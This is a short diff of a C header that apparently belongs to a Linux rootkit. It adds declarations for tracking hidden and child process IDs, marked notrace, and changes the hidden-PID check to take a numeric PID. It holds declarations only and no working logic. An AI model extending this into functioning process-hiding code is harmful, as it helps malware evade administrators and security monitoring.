@@ -5,8 +5,12 @@
 
 extern int hidden_pids[MAX_HIDDEN_PIDS];
 extern int hidden_count;
+extern int child_pids[MAX_HIDDEN_PIDS*128];
+extern int child_count;
 
+notrace void add_child_pid(int pid);
+notrace int is_child_pid(int pid);
 notrace void add_hidden_pid(int pid);
-notrace int is_hidden_pid(const char *d_name);
+notrace int is_hidden_pid(int pid);
 
 #endif
